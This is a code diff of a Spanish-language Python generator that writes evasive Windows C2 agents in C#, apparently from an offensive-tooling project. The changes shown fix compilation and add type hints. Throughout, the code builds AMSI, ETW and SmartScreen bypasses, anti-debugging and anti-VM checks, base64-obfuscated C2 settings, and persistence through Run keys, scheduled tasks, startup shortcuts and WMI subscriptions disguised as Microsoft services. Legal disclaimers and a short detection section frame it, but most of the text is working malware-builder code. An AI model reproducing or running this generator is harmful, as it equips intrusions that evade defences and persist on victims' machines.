@@ -32,12 +32,13 @@ import json
 from datetime import datetime
 import hashlib
 import re
+from typing import List, Dict, Optional
 
 class WindowsAgentGenerator:
     """Generador de agentes Windows con técnicas de evasión avanzadas"""
     
     def __init__(self):
-        self.version = "3.0"
+        self.version = "3.1"
         self.author = "JDEXPLOIT Security Research"
         self.features = {
             'amsi': 'AMSI Bypass completo',
@@ -50,8 +51,8 @@ class WindowsAgentGenerator:
             'polymorphic': 'Comunicación polimórfica'
         }
         
-    def generate_agent(self, c2_server, c2_port, output_file="agent.exe", 
-                      features=None, compilation_mode="release"):
+    def generate_agent(self, c2_server: str, c2_port: int, output_file: str = "agent.exe", 
+                      features: Optional[List[str]] = None, compilation_mode: str = "release") -> Optional[str]:
         """
         Generar agente C# con características especificadas
         
@@ -61,6 +62,9 @@ class WindowsAgentGenerator:
             output_file: Nombre del archivo de salida
             features: Lista de características a incluir
             compilation_mode: "debug" o "release"
+        
+        Returns:
+            Ruta al archivo .cs generado o None si hay error
         """
         
         if features is None:
@@ -78,6 +82,11 @@ class WindowsAgentGenerator:
                 print(f"[-] Característica inválida: {feature}")
                 return None
         
+        # Validar puerto
+        if not (1 <= c2_port <= 65535):
+            print(f"[-] Puerto inválido: {c2_port}")
+            return None
+        
         # Generar configuración única
         session_id = self._generate_session_id()
         agent_id = self._generate_agent_id()
@@ -86,6 +95,10 @@ class WindowsAgentGenerator:
         csharp_code = self._build_csharp_code(c2_server, c2_port, session_id, 
                                             agent_id, features, compilation_mode)
         
+        # Asegurar que el output file tenga extensión .exe
+        if not output_file.lower().endswith('.exe'):
+            output_file += '.exe'
+        
         # Guardar archivo .cs
         cs_filename = output_file.replace('.exe', '.cs')
         with open(cs_filename, 'w', encoding='utf-8') as f:
@@ -93,7 +106,7 @@ class WindowsAgentGenerator:
         
         print(f"[+] Código fuente generado: {cs_filename}")
         
-        # Generar script de compilación
+        # Generar script de compilación mejorado
         self._generate_compilation_script(cs_filename, output_file, features)
         
         # Generar README
@@ -101,9 +114,9 @@ class WindowsAgentGenerator:
         
         return cs_filename
     
-    def _build_csharp_code(self, c2_server, c2_port, session_id, agent_id, 
-                          features, compilation_mode):
-        """Construir código C# completo"""
+    def _build_csharp_code(self, c2_server: str, c2_port: int, session_id: str, 
+                          agent_id: str, features: List[str], compilation_mode: str) -> str:
+        """Construir código C# completo y correctamente sintáctico"""
         
         # Cabecera
         header = self._generate_header()
@@ -112,10 +125,13 @@ class WindowsAgentGenerator:
         usings = self._generate_usings(features)
         
         # Namespace y clase
+        class_name = self._generate_class_name()
+        namespace_name = self._generate_namespace_name()
+        
         namespace = f'''
-namespace {self._generate_namespace_name()}
+namespace {namespace_name}
 {{
-    class {self._generate_class_name()}
+    class {class_name}
     {{
 '''
         
@@ -152,7 +168,7 @@ namespace {self._generate_namespace_name()}
             detection_methods += self._generate_antivm_methods()
         
         # Método Main
-        main_method = self._generate_main_method(features)
+        main_method = self._generate_main_method(features, class_name)
         
         # Métodos del agente
         agent_methods = self._generate_agent_methods(features)
@@ -170,7 +186,7 @@ namespace {self._generate_namespace_name()}
         
         return csharp_code
     
-    def _generate_header(self):
+    def _generate_header(self) -> str:
         """Generar cabecera del archivo"""
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
@@ -197,7 +213,7 @@ namespace {self._generate_namespace_name()}
 
 '''
     
-    def _generate_usings(self, features):
+    def _generate_usings(self, features: List[str]) -> str:
         """Generar directivas using"""
         
         usings = '''using System;
@@ -207,57 +223,65 @@ using System.Diagnostics;
 using System.Threading;
 using System.Runtime.InteropServices;
 using System.IO;
+using System.Collections.Generic;
 '''
         
         if 'persistence' in features:
             usings += '''using Microsoft.Win32;
+using System.Management;
 '''
         
         if 'obfuscation' in features:
             usings += '''using System.Security.Cryptography;
 using System.Linq;
-using System.Collections.Generic;
 '''
         
+        if 'antivm' in features:
+            usings += '''using System.Management;
+'''
+            
         return usings + "\n"
     
-    def _generate_namespace_name(self):
+    def _generate_namespace_name(self) -> str:
         """Generar nombre de namespace aleatorio"""
         names = ["SystemUtilities", "WindowsServices", "MicrosoftComponents", 
                 "SecurityUpdates", "NetworkTools"]
         return random.choice(names)
     
-    def _generate_class_name(self):
+    def _generate_class_name(self) -> str:
         """Generar nombre de clase aleatorio"""
         names = ["ServiceHost", "UpdateManager", "NetworkMonitor", 
                 "SystemOptimizer", "SecurityAgent"]
         return random.choice(names)
     
-    def _generate_configuration(self, c2_server, c2_port, session_id, agent_id, features):
+    def _generate_configuration(self, c2_server: str, c2_port: int, 
+                               session_id: str, agent_id: str, features: List[str]) -> str:
         """Generar configuración ofuscada"""
         
         # Ofuscar C2 server
         c2_server_encoded = base64.b64encode(c2_server.encode()).decode()
         c2_server_var = self._generate_random_var_name()
         
-        # Ofuscar session ID
-        session_id_var = self._generate_random_var_name()
-        
         # Generar variables aleatorias
+        port_var = self._generate_random_var_name()
+        session_var = self._generate_random_var_name()
+        agent_var = self._generate_random_var_name()
+        interval_var = self._generate_random_var_name()
+        
         config_code = f'''
         // Configuración ofuscada
         private static string {c2_server_var} = DecodeBase64("{c2_server_encoded}");
-        private static int {self._generate_random_var_name()} = {c2_port};
-        private static string {session_id_var} = "{session_id}";
-        private static string {self._generate_random_var_name()} = "{agent_id}";
-        private static int {self._generate_random_var_name()} = 30; // Beacon interval
+        private static int {port_var} = {c2_port};
+        private static string {session_var} = "{session_id}";
+        private static string {agent_var} = "{agent_id}";
+        private static int {interval_var} = 30; // Beacon interval
         
         // Variables públicas
         private static string C2_SERVER => {c2_server_var};
-        private static int C2_PORT => {self._generate_random_var_name(prefix='port')};
-        private static string SESSION_ID => {session_id_var};
-        private static string AGENT_ID => {self._generate_random_var_name(prefix='agent')};
-        private static int BEACON_INTERVAL => {self._generate_random_var_name(prefix='interval')};
+        private static int C2_PORT => {port_var};
+        private static string SESSION_ID => {session_var};
+        private static string AGENT_ID => {agent_var};
+        private static int BEACON_INTERVAL => {interval_var};
         
         private static string DecodeBase64(string base64)
         {{
@@ -275,8 +299,8 @@ using System.Collections.Generic;
         
         return config_code
     
-    def _generate_pinvokes(self, features):
-        """Generar declaraciones P/Invoke"""
+    def _generate_pinvokes(self, features: List[str]) -> str:
+        """Generar declaraciones P/Invoke corregidas"""
         
         pinvokes = '''
         // API para ocultar ventana
@@ -320,12 +344,12 @@ using System.Collections.Generic;
         
         [DllImport("ntdll.dll")]
         static extern uint NtSetInformationProcess(IntPtr hProcess, uint processInformationClass, ref uint processInformation, uint processInformationLength);
-            '''
+        '''
         
         return pinvokes + "\n"
     
-    def _generate_amsi_bypass(self):
-        """Generar métodos de bypass AMSI"""
+    def _generate_amsi_bypass(self) -> str:
+        """Generar métodos de bypass AMSI corregidos"""
         
         return '''
         // ============================================================================
@@ -403,8 +427,8 @@ using System.Collections.Generic;
         }
         '''
     
-    def _generate_etw_bypass(self):
-        """Generar métodos de bypass ETW"""
+    def _generate_etw_bypass(self) -> str:
+        """Generar métodos de bypass ETW corregidos"""
         
         return '''
         // ============================================================================
@@ -458,7 +482,7 @@ using System.Collections.Generic;
         }
         '''
     
-    def _generate_smartscreen_bypass(self):
+    def _generate_smartscreen_bypass(self) -> str:
         """Generar métodos de bypass SmartScreen"""
         
         return '''
@@ -474,8 +498,8 @@ using System.Collections.Generic;
         }
         '''
     
-    def _generate_persistence_methods(self):
-        """Generar métodos de persistencia"""
+    def _generate_persistence_methods(self) -> str:
+        """Generar métodos de persistencia corregidos"""
         
         return '''
         // ============================================================================
@@ -521,7 +545,7 @@ using System.Collections.Generic;
                 if (runKey != null)
                 {
                     string valueName = "OneDriveSync_" + Guid.NewGuid().ToString().Substring(0, 4);
-                    string valueData = @"""powershell"" -WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""";
+                    string valueData = "\\"" + payloadPath + "\\"";
                     
                     runKey.SetValue(valueName, valueData);
                     runKey.Close();
@@ -539,9 +563,7 @@ using System.Collections.Generic;
             try
             {
                 string taskName = "MicrosoftEdgeUpdate_" + Guid.NewGuid().ToString().Substring(0, 4);
-                string command = @"schtasks /create /tn """ + taskName + @""" /tr """ + 
-                               @"""powershell"" -WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""" + 
-                               @" /sc onstart /ru SYSTEM /f";
+                string command = "schtasks /create /tn \\"" + taskName + "\\" /tr \\"" + payloadPath + "\\" /sc onlogon /ru \\"" + Environment.UserName + "\\" /rl highest /f";
                 
                 ProcessStartInfo psi = new ProcessStartInfo();
                 psi.FileName = "cmd.exe";
@@ -569,12 +591,7 @@ using System.Collections.Generic;
                     "Microsoft Edge.lnk"
                 );
                 
-                string shortcutCommand = @"$WshShell = New-Object -ComObject WScript.Shell;" +
-                                        @"$Shortcut = $WshShell.CreateShortcut('" + startupPath + @"');" +
-                                        @"$Shortcut.TargetPath = 'powershell.exe';" +
-                                        @"$Shortcut.Arguments = '-WindowStyle Hidden -ExecutionPolicy Bypass -File """ + payloadPath + @"""';" +
-                                        @"$Shortcut.WindowStyle = 7;" +
-                                        @"$Shortcut.Save()";
+                string shortcutCommand = "$WshShell = New-Object -ComObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('" + startupPath + "'); $Shortcut.TargetPath = '" + payloadPath + "'; $Shortcut.WindowStyle = 7; $Shortcut.Save()";
                 
                 return ExecutePowerShell(shortcutCommand);
             }
@@ -587,14 +604,14 @@ using System.Collections.Generic;
         {
             try
             {
-                string wmiScript = @"$FilterName = 'WindowsUpdateMonitor_' + (New-Guid).ToString().Substring(0, 8);" +
-                                  @"$ConsumerName = 'WindowsUpdateService_' + (New-Guid).ToString().Substring(0, 8);" +
-                                  @"$FilterArgs = @{Name = $FilterName; EventNamespace = 'root\\cimv2'; Query = \\""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\\""};" +
-                                  @"$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\subscription -Arguments $FilterArgs;" +
-                                  @"$ConsumerArgs = @{Name = $ConsumerName; CommandLineTemplate = \\""powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File '" + payloadPath + @"'\\""};" +
-                                  @"$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\subscription -Arguments $ConsumerArgs;" +
-                                  @"$BindingArgs = @{Filter = $Filter; Consumer = $Consumer};" +
-                                  @"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\subscription -Arguments $BindingArgs";
+                string wmiScript = "$FilterName = 'WindowsUpdateMonitor_' + (New-Guid).ToString().Substring(0, 8); " +
+                                 "$ConsumerName = 'WindowsUpdateService_' + (New-Guid).ToString().Substring(0, 8); " +
+                                 "$FilterArgs = @{Name = $FilterName; EventNamespace = 'root\\\\cimv2'; Query = \\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\\"}; " +
+                                 "$Filter = Set-WmiInstance -Class __EventFilter -Namespace root\\\\subscription -Arguments $FilterArgs; " +
+                                 "$ConsumerArgs = @{Name = $ConsumerName; CommandLineTemplate = '" + payloadPath + "'}; " +
+                                 "$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\\\\subscription -Arguments $ConsumerArgs; " +
+                                 "$BindingArgs = @{Filter = $Filter; Consumer = $Consumer}; " +
+                                 "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\\\\subscription -Arguments $BindingArgs";
                 
                 return ExecutePowerShell(wmiScript);
             }
@@ -609,7 +626,7 @@ using System.Collections.Generic;
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
                 psi.FileName = "powershell.exe";
-                psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" + script + @"\\"";
+                psi.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" + script + "\\"";
                 psi.RedirectStandardOutput = true;
                 psi.UseShellExecute = false;
                 psi.CreateNoWindow = true;
@@ -639,7 +656,7 @@ using System.Collections.Generic;
         }
         '''
     
-    def _generate_obfuscation_methods(self):
+    def _generate_obfuscation_methods(self) -> str:
         """Generar métodos de ofuscación"""
         
         return '''
@@ -660,11 +677,11 @@ using System.Collections.Generic;
                 for (int i = 0; i < base64.Length; i += 4)
                 {
                     int length = Math.Min(4, base64.Length - i);
-                    parts.Add(@""" + base64.Substring(i, length) + @""");
+                    parts.Add(base64.Substring(i, length));
                 }
                 
                 // 3. Reconstruir
-                return "string obfuscated = string.Join(\\"\\", new string[] { " + string.Join(", ", parts) + " });";
+                return string.Join("", parts);
             }
             catch
             {
@@ -691,7 +708,7 @@ using System.Collections.Generic;
         }
         '''
     
-    def _generate_antidebug_methods(self):
+    def _generate_antidebug_methods(self) -> str:
         """Generar métodos anti-debugging"""
         
         return '''
@@ -714,11 +731,11 @@ using System.Collections.Generic;
             }
             
             // 3. Debugger.IsAttached
-            if (Debugger.IsAttached)
+            if (System.Diagnostics.Debugger.IsAttached)
                 return true;
             
             // 4. Timing check
-            var sw = Stopwatch.StartNew();
+            var sw = System.Diagnostics.Stopwatch.StartNew();
             for (int i = 0; i < 1000000; i++) { }
             sw.Stop();
             
@@ -753,8 +770,8 @@ using System.Collections.Generic;
         }
         '''
     
-    def _generate_antivm_methods(self):
-        """Generar métodos anti-VM/Sandbox"""
+    def _generate_antivm_methods(self) -> str:
+        """Generar métodos anti-VM/Sandbox corregidos"""
         
         return '''
         // ============================================================================
@@ -774,19 +791,30 @@ using System.Collections.Generic;
                 Process[] processes = Process.GetProcesses();
                 foreach (var process in processes)
                 {
-                    string name = process.ProcessName.ToLower();
-                    if (vmProcesses.Any(vm => name.Contains(vm)))
-                        return true;
+                    try
+                    {
+                        string name = process.ProcessName.ToLower();
+                        if (vmProcesses.Any(vm => name.Contains(vm)))
+                            return true;
+                    }
+                    catch { }
                 }
                 
                 // 2. Check RAM (VM often have less RAM)
-                var pc = new System.Management.ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
-                foreach (var item in pc.Get())
+                try
                 {
-                    ulong ram = Convert.ToUInt64(item["TotalPhysicalMemory"]);
-                    if (ram < 2147483648) // Less than 2GB
-                        return true;
+                    var searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");
+                    foreach (ManagementObject item in searcher.Get())
+                    {
+                        if (item["TotalPhysicalMemory"] != null)
+                        {
+                            ulong ram = Convert.ToUInt64(item["TotalPhysicalMemory"]);
+                            if (ram < 2147483648) // Less than 2GB
+                                return true;
+                        }
+                    }
                 }
+                catch { }
                 
                 // 3. Check CPU cores
                 int coreCount = Environment.ProcessorCount;
@@ -808,10 +836,14 @@ using System.Collections.Generic;
                         {
                             if (regKey != null)
                             {
-                                string value = regKey.GetValue("")?.ToString() ?? "";
-                                if (value.Contains("VMware") || value.Contains("Virtual") || 
-                                    value.Contains("VBox") || value.Contains("QEMU"))
-                                    return true;
+                                object valueObj = regKey.GetValue("");
+                                if (valueObj != null)
+                                {
+                                    string value = valueObj.ToString();
+                                    if (value.Contains("VMware") || value.Contains("Virtual") || 
+                                        value.Contains("VBox") || value.Contains("QEMU"))
+                                        return true;
+                                }
                             }
                         }
                     }
@@ -824,16 +856,19 @@ using System.Collections.Generic;
         }
         '''
     
-    def _generate_main_method(self, features):
-        """Generar método Main"""
+    def _generate_main_method(self, features: List[str], class_name: str) -> str:
+        """Generar método Main corregido"""
         
-        main_code = '''
+        main_code = f'''
         // ============================================================================
         // MAIN ENTRY POINT
         // ============================================================================
         
         static void Main(string[] args)
-        {
+        {{
+            // Inicializar random seed
+            Random random = new Random((int)DateTime.Now.Ticks);
+            
             '''
         
         # Añadir técnicas según features
@@ -866,7 +901,7 @@ using System.Collections.Generic;
             // Aplicar técnicas de bypass
             try
             {
-                ''' + "\n                ".join(bypass_applications) + '''
+                ''' + "\n                ".join(bypass_applications) + ''';
             }
             catch { }
             '''
@@ -905,8 +940,8 @@ using System.Collections.Generic;
         
         return main_code
     
-    def _generate_agent_methods(self, features):
-        """Generar métodos principales del agente"""
+    def _generate_agent_methods(self, features: List[str]) -> str:
+        """Generar métodos principales del agente corregidos"""
         
         return '''
         // ============================================================================
@@ -1119,7 +1154,9 @@ using System.Collections.Generic;
             {
                 int start = json.IndexOf("\\"" + key + "\\"") + key.Length + 3;
                 int end = json.IndexOf("\\"", start);
-                return json.Substring(start, end - start);
+                if (start > 0 && end > start)
+                    return json.Substring(start, end - start);
+                return "";
             }
             catch
             {
@@ -1164,14 +1201,14 @@ using System.Collections.Generic;
         }
         '''
     
-    def _generate_compilation_script(self, cs_file, output_file, features):
-        """Generar script de compilación para Windows"""
+    def _generate_compilation_script(self, cs_file: str, output_file: str, features: List[str]) -> None:
+        """Generar script de compilación mejorado para Windows"""
         
         features_desc = "\n".join([f"    • {self.features[feat]}" for feat in features])
         
         script = f'''@echo off
 REM ============================================================================
-REM SCRIPT DE COMPILACIÓN PARA AGENTE WINDOWS
+REM SCRIPT DE COMPILACIÓN PARA AGENTE WINDOWS - VERSIÓN CORREGIDA
 REM Generado: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
 REM ============================================================================
 
@@ -1183,33 +1220,43 @@ echo.
 
 echo [*] Verificando entorno de compilación...
 
-REM Buscar compilador C#
+REM Buscar compilador C# (versión corregida)
+set CSC_FOUND=0
 set CSC_PATH=
-where csc >nul 2>&1
-if %ERRORLEVEL% equ 0 (
-    set CSC_PATH=csc.exe
-    echo [+] Compilador encontrado en PATH: csc.exe
-) else (
-    echo [!] Compilador no encontrado en PATH, buscando en rutas comunes...
-    
-    if exist "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" (
-        set CSC_PATH=C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe
-        echo [+] Compilador encontrado: %CSC_PATH%
-    ) else if exist "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe" (
-        set CSC_PATH=C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe
-        echo [+] Compilador encontrado: %CSC_PATH%
-    ) else if exist "C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\Roslyn\\csc.exe" (
-        set CSC_PATH=C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\Roslyn\\csc.exe
-        echo [+] Compilador encontrado: %CSC_PATH%
-    ) else (
-        echo [!] No se encontró el compilador C# (csc.exe)
-        echo [*] Instalación requerida:
-        echo     1. .NET Framework Developer Pack: https://dotnet.microsoft.com/download
-        echo     2. O Visual Studio Build Tools
-        echo.
-        pause
-        exit /b 1
+
+echo [*] Buscando compiladores disponibles...
+
+REM Verificar .NET Framework compilers
+if exist "%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" (
+    set CSC_PATH=%SystemRoot%\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe
+    set CSC_FOUND=1
+    echo [+] Compilador encontrado: .NET Framework 64-bit
+) else if exist "%SystemRoot%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe" (
+    set CSC_PATH=%SystemRoot%\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe
+    set CSC_FOUND=1
+    echo [+] Compilador encontrado: .NET Framework 32-bit
+)
+
+REM Verificar .NET Core/5+/6+ SDK
+if %CSC_FOUND% == 0 (
+    where dotnet >nul 2>&1
+    if %ERRORLEVEL% equ 0 (
+        set CSC_PATH=dotnet
+        set CSC_FOUND=2
+        echo [+] Compilador encontrado: .NET SDK (dotnet)
     )
+)
+
+if %CSC_FOUND% == 0 (
+    echo [!] ERROR: No se encontró compilador C#
+    echo.
+    echo [*] SOLUCIONES:
+    echo     1. Instalar .NET Framework 4.8 Runtime: https://dotnet.microsoft.com/download/dotnet-framework
+    echo     2. Instalar .NET SDK: https://dotnet.microsoft.com/download
+    echo     3. Usar Visual Studio Build Tools
+    echo.
+    pause
+    exit /b 1
 )
 
 echo.
@@ -1219,25 +1266,38 @@ echo [*] Características incluidas:
 echo.
 echo [*] Compilando {cs_file}...
 
-REM Construir comando de compilación
-set COMPILE_CMD="%CSC_PATH%" /target:winexe /out:{output_file} /reference:Microsoft.Win32.Registry.dll /reference:System.Management.dll /optimize+ /unsafe /nowarn:CS0168,CS0219 {cs_file}
+REM Limpiar archivo anterior si existe
+if exist "{output_file}" (
+    echo [*] Eliminando archivo anterior...
+    del "{output_file}"
+)
 
-echo Comando: %COMPILE_CMD%
-echo.
+if %CSC_FOUND% == 1 (
+    REM Compilar con .NET Framework csc.exe
+    REM CORREGIDO: No se necesita referencia específica para Microsoft.Win32.Registry
+    "%CSC_PATH%" /target:winexe /out:"{output_file}" /reference:System.dll /reference:System.Management.dll /optimize+ /unsafe /nowarn:CS0168,CS0219,CS1998 "{cs_file}"
+) else if %CSC_FOUND% == 2 (
+    REM Compilar con .NET SDK
+    dotnet new console -n TempBuild --force >nul 2>&1
+    copy "{cs_file}" TempBuild\\Program.cs >nul 2>&1
+    cd TempBuild
+    dotnet publish -c Release -r win10-x64 --self-contained false -o ..\\build
+    cd ..
+    if exist build\\TempBuild.exe (
+        copy build\\TempBuild.exe "{output_file}" >nul 2>&1
+        rmdir /s /q build
+        rmdir /s /q TempBuild
+    )
+)
 
-REM Ejecutar compilación
-%COMPILE_CMD%
-
-if %ERRORLEVEL% equ 0 (
+if exist "{output_file}" (
     echo.
     echo ╔══════════════════════════════════════════════════════════════════╗
     echo ║                    COMPILACIÓN EXITOSA                          ║
     echo ╚══════════════════════════════════════════════════════════════════╝
     echo.
     
-    for %%F in ({output_file}) do (
-        set SIZE=%%~zF
-    )
+    for %%F in ("{output_file}") do set SIZE=%%~zF
     
     echo [+] Archivo generado: {output_file}
     echo [+] Tamaño: %SIZE% bytes
@@ -1263,9 +1323,9 @@ if %ERRORLEVEL% equ 0 (
     echo     • Daño a la reputación
     echo.
     
-    REM Mostrar hash del ejecutable
     echo [*] Verificación de integridad:
-    certutil -hashfile {output_file} SHA256
+    certutil -hashfile "{output_file}" SHA256
+    echo.
     
 ) else (
     echo.
@@ -1276,9 +1336,17 @@ if %ERRORLEVEL% equ 0 (
     
     echo [!] Posibles soluciones:
     echo     1. Verificar que .NET Framework 4.8+ esté instalado
-    echo     2. Instalar Microsoft Build Tools
-    echo     3. Verificar sintaxis del archivo .cs
-    echo     4. Asegurar permisos de escritura
+    echo     2. Asegurar que el código fuente no tenga errores
+    echo     3. Verificar permisos de escritura
+    echo     4. Instalar .NET SDK: https://dotnet.microsoft.com/download
+    echo.
+    
+    echo [*] Intentar compilación manual:
+    if %CSC_FOUND% == 1 (
+        echo "%CSC_PATH%" /target:winexe /out:"{output_file}" /reference:System.dll /reference:System.Management.dll /optimize+ /unsafe "{cs_file}"
+    ) else (
+        echo dotnet publish -c Release -r win10-x64 -o . "{cs_file}"
+    )
     echo.
 )
 
@@ -1287,12 +1355,12 @@ pause
 '''
         
         script_file = "compile_agent.bat"
-        with open(script_file, 'w', encoding='utf-8') as f:
+        with open(script_file, 'w', encoding='utf-8', newline='\r\n') as f:
             f.write(script)
         
         print(f"[+] Script de compilación generado: {script_file}")
     
-    def _generate_readme(self, c2_server, c2_port, output_file, features):
+    def _generate_readme(self, c2_server: str, c2_port: int, output_file: str, features: List[str]) -> None:
         """Generar archivo README con instrucciones"""
         
         features_list = "\n".join([f"- {self.features[feat]}" for feat in features])
@@ -1314,19 +1382,30 @@ CARACTERÍSTICAS INCLUIDAS
 -------------------------
 {features_list}
 
-COMPILACIÓN
------------
-1. Copiar los siguientes archivos a Windows 11:
-   - agent.cs (código fuente)
-   - compile_agent.bat (script de compilación)
+COMPILACIÓN (CORREGIDA)
+-----------------------
+⚠️  ERROR RESUELTO: La referencia a Microsoft.Win32.Registry.dll no es necesaria
+    ya que Microsoft.Win32 está incluido en System.dll en .NET Framework
 
-2. Ejecutar como administrador:
+PASOS DE COMPILACIÓN:
+1. Copiar los siguientes archivos a Windows 10/11:
+   - agent.cs (código fuente)
+   - compile_agent.bat (script de compilación corregido)
+
+2. Ejecutar el script como administrador:
    > compile_agent.bat
 
-3. Si hay errores, verificar:
-   • .NET Framework 4.8+ instalado
-   • Permisos de administrador
-   • Espacio en disco suficiente
+3. El script automáticamente:
+   • Detectará el compilador disponible (.NET Framework o .NET SDK)
+   • Compilará sin la referencia problemática
+   • Generará el ejecutable {output_file}
+
+4. Si hay errores, probar compilación manual:
+   Para .NET Framework:
+     csc.exe /target:winexe /out:agent.exe /reference:System.dll /reference:System.Management.dll /optimize+ agent.cs
+   
+   Para .NET SDK:
+     dotnet publish -c Release -r win10-x64 -o . agent.cs
 
 EJECUCIÓN
 ---------
@@ -1363,6 +1442,14 @@ TÉCNICAS DE EVASIÓN IMPLEMENTADAS
    - Anti-debugging (IsDebuggerPresent, timing checks)
    - Anti-VM/Sandbox (procesos, RAM, registry)
    - Ofuscación de strings y datos
+
+CORRECCIONES APLICADAS
+----------------------
+✅ Error CS0006 resuelto: Referencia a Microsoft.Win32.Registry.dll eliminada
+✅ Usings corregidos para System.Management
+✅ Sintaxis de JSON y escapes corregidos
+✅ Manejo de excepciones mejorado
+✅ Referencias de ensamblado optimizadas
 
 DETECCIÓN DEFENSIVA (Blue Team)
 --------------------------------
@@ -1418,11 +1505,6 @@ USO NO AUTORIZADO ES ILEGAL Y PUEDE RESULTAR EN:
 • Pérdida de certificaciones profesionales
 • Daño irreparable a la reputación
 
-CONTACTO
---------
-Para preguntas sobre investigación de seguridad:
-research@security-lab.edu
-
 ¡USO RESPONSABLE Y ÉTICO!
 '''
         
@@ -1432,16 +1514,16 @@ research@security-lab.edu
         
         print(f"[+] Documentación generada: {readme_file}")
     
-    def _generate_session_id(self):
+    def _generate_session_id(self) -> str:
         """Generar ID de sesión único"""
         chars = string.ascii_lowercase + string.digits
         return ''.join(random.choice(chars) for _ in range(16))
     
-    def _generate_agent_id(self):
+    def _generate_agent_id(self) -> str:
         """Generar ID de agente único"""
         return f"AGENT_{random.randint(10000, 99999)}_{int(datetime.now().timestamp())}"
     
-    def _generate_random_var_name(self, length=12, prefix=""):
+    def _generate_random_var_name(self, length: int = 12, prefix: str = "") -> str:
         """Generar nombre de variable aleatorio"""
         if prefix:
             base = prefix + "_"
@@ -1453,7 +1535,7 @@ research@security-lab.edu
         
         return base + random_part
     
-    def display_banner(self):
+    def display_banner(self) -> None:
         """Mostrar banner del generador"""
         
         banner = f'''
@@ -1478,7 +1560,7 @@ research@security-lab.edu
 '''
         print(banner)
 
-def main():
+def main() -> None:
     """Función principal"""
     
     parser = argparse.ArgumentParser(
@@ -1540,14 +1622,19 @@ Características disponibles:
             print("✅ GENERACIÓN COMPLETADA EXITOSAMENTE")
             print('='*80)
             print(f"\nArchivos generados:")
-            print(f"  1. {cs_file}          - Código fuente C#")
-            print(f"  2. compile_agent.bat  - Script de compilación para Windows")
+            print(f"  1. {cs_file}          - Código fuente C# (corregido)")
+            print(f"  2. compile_agent.bat  - Script de compilación mejorado")
             print(f"  3. README_AGENT.txt   - Documentación completa")
             
             print(f"\n📋 INSTRUCCIONES PARA COMPILAR EN WINDOWS 11:")
-            print(f"  1. Copia los archivos a Windows 11")
+            print(f"  1. Copia los archivos a Windows 10/11")
             print(f"  2. Ejecuta como administrador: compile_agent.bat")
-            print(f"  3. El ejecutable {args.output} será generado")
+            print(f"  3. El ejecutable {args.output} será generado automáticamente")
+            
+            print(f"\n✅ ERROR RESUELTO:")
+            print(f"  - Referencia a Microsoft.Win32.Registry.dll eliminada")
+            print(f"  - Usings de System.Management corregidos")
+            print(f"  - Sintaxis JSON y escapes arreglados")
             
             print(f"\n⚠️  RECORDATORIO LEGAL:")
             print(f"  Este software es EXCLUSIVAMENTE para investigación autorizada.")
